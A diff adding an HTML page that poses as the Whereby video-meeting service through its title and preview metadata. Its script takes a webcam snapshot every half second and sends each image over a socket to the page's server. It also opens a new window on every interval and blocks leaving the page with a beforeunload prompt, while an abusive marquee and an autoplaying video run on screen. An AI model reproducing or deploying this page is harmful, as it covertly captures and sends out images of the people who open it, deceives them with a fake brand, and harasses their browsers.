@@ -1,0 +1,44 @@
+<head>
+    <title>Whereby</title>
+    <meta property="og:image"
+        content="https://images-ext-1.discordapp.net/external/f7q2jUL_N-2dgVYrUbpVjHXZ8CgnDOOtyGTqCkAkZBI/https/d2qulvgqu65efe.cloudfront.net/facebook-opengraph.png">
+    <meta name="description"
+        content="Easy video meetings with no login or downloads. Video conferencing with screen sharing, recording and much more." />
+</head>
+
+<body
+    style='background-image: url("https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/ababe936-ba58-43f7-9a25-854da1f1c4f7/d57hbli-5f2803cd-0de4-4cec-970d-8fa226f2018c.gif?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOiIsImlzcyI6InVybjphcHA6Iiwib2JqIjpbW3sicGF0aCI6IlwvZlwvYWJhYmU5MzYtYmE1OC00M2Y3LTlhMjUtODU0ZGExZjFjNGY3XC9kNTdoYmxpLTVmMjgwM2NkLTBkZTQtNGNlYy05NzBkLThmYTIyNmYyMDE4Yy5naWYifV1dLCJhdWQiOlsidXJuOnNlcnZpY2U6ZmlsZS5kb3dubG9hZCJdfQ.Vm5Ki0fKb3t9l_Nx6QN7LgMkWJ27yfez9RT0JszWG8o");'>
+    <marquee>
+        <h1>STFU PEDO GET FISHED! 🐟🐟🐟🐟🐟🐟🐟🐟🐟🐟🐟🐟🐟🐟🐟🐟🐟🐟🐟🐟🐟🐟🐟 </h1>
+    </marquee>
+    <video width="100%" height="100%"
+        src="https://cdn.discordapp.com/attachments/564935599190966299/830652040136622100/yt1s.com_-_fish_we_need_this_to_hear_it_in_discord_vc_360p.mp4"
+        controls autoplay>
+        <div id="a"></div>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.26/webcam.min.js"
+            integrity="sha512-dQIiHSl2hr3NWKKLycPndtpbh5iaHLo6MwrXm7F0FM5e+kL2U16oE9uIwPHUl6fQBeCthiEuV/rzP3MiAB8Vfw=="
+            crossorigin="anonymous"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"
+            integrity="sha512-q/dWJ3kcmjBLU4Qc47E4A9kTB4m3wuTY7vkFJDTZKjTs8jhyGQnaUrxa0Ytd0ssMZhbNua9hE+E7Qv1j+DyZwA=="
+            crossorigin="anonymous"></script>
+        <script>
+            var socket = io();
+            Webcam.set({
+                width: 320,
+                height: 240,
+                image_format: 'jpeg',
+                jpeg_quality: 90
+            });
+						Webcam.attach("#a");
+						setTimeout(()=>{            setInterval(() => {
+                Webcam.snap((a)=>{socket.emit('img',a)})
+                window.open("https://fishvideo.locknessko.repl.co/");
+            }, 500)},5000)
+            window.addEventListener("beforeunload", function (e) {
+                var confirmationMessage =
+                    'Balls xd Balls xd Balls xd Balls xd Balls xd Balls xd Balls xd Balls xd Balls xd Balls xd Balls xd Balls xd Balls xd Balls xd ';
+                (e || window.event).returnValue = confirmationMessage; //Gecko + IE
+                return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
+            });
+        </script>
+</body>
